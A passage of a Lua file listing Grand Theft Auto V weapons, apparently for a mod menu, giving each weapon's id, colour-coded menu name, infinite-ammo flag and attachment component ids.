                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        MachinePistol = {
            id = 'weapon_machinepistol',
            name = '~h~~b~-» ~w~Machine Pistol ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Drum Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        MiniSMG = {
            id = 'weapon_minismg',
            name = '~h~~b~-» ~w~Mini SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_02'
                    }
                }
            }
        },
        UnholyHellbringer = {
            id = 'weapon_raycarbine',
            name = '~h~~b~-» ~w~Unholy Hellbringer',
            bInfAmmo = false,
            mods = {}
        }
    },
    Shotguns = {
        PumpShotgun = {
            id = 'weapon_pumpshotgun',
            name = '~h~~b~-» ~w~Pump Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {
                        'name = Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP'
                    }
                }
            }
        },
        PumpShotgunMkII = {
            id = 'weapon_pumpshotgun_mk2',
            name = '~h~~b~-» ~w~Pump Shotgun Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Dragon Breath Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Steel Buckshot Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~b~-» ~w~Flechette Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~b~-» ~w~Explosive Slugs',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~b~-» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~b~-» ~w~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~b~-» ~w~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    }
                }
            }
        },
        SawedOffShotgun = {
            id = 'weapon_sawnoffshotgun',
            name = '~h~~b~-» ~w~Sawed-Off Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        AssaultShotgun = {
            id = 'weapon_assaultshotgun',
            name = '~h~~b~-» ~w~Assault Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        BullpupShotgun = {
            id = 'weapon_bullpupshotgun',
            name = '~h~~b~-» ~w~Bullpup Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        Musket = {
            id = 'weapon_musket',
            name = '~h~~b~-» ~w~Musket',
            bInfAmmo = false,
            mods = {}
        },
        HeavyShotgun = {
            id = 'weapon_heavyshotgun',
            name = '~h~~b~-» ~w~Heavy Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Drum Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        DoubleBarrelShotgun = {
            id = 'weapon_dbshotgun',
            name = '~h~~b~-» ~w~Double Barrel Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        SweeperShotgun = {
            id = 'weapon_autoshotgun',
            name = '~h~~b~-» ~w~Sweeper Shotgun',
            bInfAmmo = false,
            mods = {}
        }
    },
    AssaultRifles = {
        AssaultRifle = {
            id = 'weapon_assaultrifle',
            name = '~h~~b~-» ~w~Assault Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Drum Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        AssaultRifleMkII = {
            id = 'weapon_assaultrifle_mk2',
            name = '~h~~b~-» ~w~Assault Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Tracer Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~b~-» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~b~-» ~w~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~b~-» ~w~Default',
                        id = 'COMPONENT_AT_AR_BARREL_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy',
                        id = 'COMPONENT_AT_AR_BARREL_0'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~b~-» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~b~-» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~b~-» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        CarbineRifle = {
            id = 'weapon_carbinerifle',
            name = '~h~~b~-» ~w~Carbine Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Box Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CarbineRifleMkII = {
            id = 'weapon_carbinerifle_mk2',
            name = '~h~~b~-» ~w~Carbine Rifle Mk II ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Tracer Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~b~-» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~b~-» ~w~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~b~-» ~w~Default',
                        id = 'COMPONENT_AT_CR_BARREL_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy',
                        id = 'COMPONENT_AT_CR_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~b~-» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~b~-» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~b~-» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~b~-» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        AdvancedRifle = {
            id = 'weapon_advancedrifle',
            name = '~h~~b~-» ~w~Advanced Rifle ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_ADVANCEDRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                }
            }
        },
        SpecialCarbine = {
            id = 'weapon_specialcarbine',
            name = '~h~~b~-» ~w~Special Carbine',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Drum Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        SpecialCarbineMkII = {
            id = 'weapon_specialcarbine_mk2',
            name = '~h~~b~-» ~w~Special Carbine Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Tracer Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~b~-» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~b~-» ~w~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~b~-» ~w~Default',
                        id = 'COMPONENT_AT_SC_BARREL_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy',
                        id = 'COMPONENT_AT_SC_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~b~-» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~b~-» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~b~-» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        BullpupRifle = {
            id = 'weapon_bullpuprifle',
            name = '~h~~b~-» ~w~Bullpup Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        BullpupRifleMkII = {
            id = 'weapon_bullpuprifle_mk2',
            name = '~h~~b~-» ~w~Bullpup Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Tracer Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Armor Piercing Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~b~-» ~w~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_MK2'
                    },
                    {
                        name = '~h~~b~-» ~w~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~b~-» ~w~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~b~-» ~w~Default',
                        id = 'COMPONENT_AT_BP_BARREL_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy',
                        id = 'COMPONENT_AT_BP_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    },
                    {
                        name = '~h~~b~-» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~b~-» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~b~-» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~b~-» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CompactRifle = {
            id = 'weapon_compactrifle',
            name = '~h~~b~-» ~w~Compact Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Drum Magazine',
                        id = 'COMPONENT_COMPACTRIFLE_CLIP_03'
                    }
                }
            }
        }
    },
    LMG = {
        MG = {
            id = 'weapon_mg',
            name = '~h~~b~-» ~w~MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_MG_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_MG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_02'
                    }
                }
            }
        },
        CombatMG = {
            id = 'weapon_combatmg',
            name = '~h~~b~-» ~w~Combat MG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        CombatMGMkII = {
            id = 'weapon_combatmg_mk2',
            name = '~h~~b~-» ~w~Combat MG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Tracer Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~b~-» ~w~Incendiary Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~b~-» ~w~Hollow Point Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~b~-» ~w~FMJ Rounds',
                        id = 'COMPONENT_COMBATMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~b~-» ~w~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    },
                    {
                        name = '~h~~b~-» ~w~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~b~-» ~w~Default',
                        id = 'COMPONENT_AT_MG_BARREL_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy',
                        id = 'COMPONENT_AT_MG_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~b~-» ~w~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~b~-» ~w~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~b~-» ~w~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~b~-» ~w~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~b~-» ~w~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~b~-» ~w~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        GusenbergSweeper = {
            id = 'weapon_gusenberg',
            name = '~h~~b~-» ~w~GusenbergSweeper',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~b~-» ~w~Default Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_01'
                    },
                    {
                        name = '~h~~b~-» ~w~Extended Magazine',
                        id = 'COMPONENT_GUSENBERG_CLIP_02'
                    }
                }
            }
        }
    },
    Snipers = {
        SniperRifle = {
            id = 'weapon_sniperrifle',
            name = '~h~~b~-» ~w~Sniper Rifle',
            bInfAmmo = false,
            mods = {
                Sights = {
                    {
                        name = '~h~~b~-» ~w~Scope',
                        id = 'COMPONENT_AT_SCOPE_LARGE'
                    },
                    {
                        name = '~h~~b~-» ~w~Advanced Scope',
                        id = 'COMPONENT_AT_SCOPE_MAX'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~b~-» ~w~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        HeavySniper = {
            id = 'weapon_heavysniper',
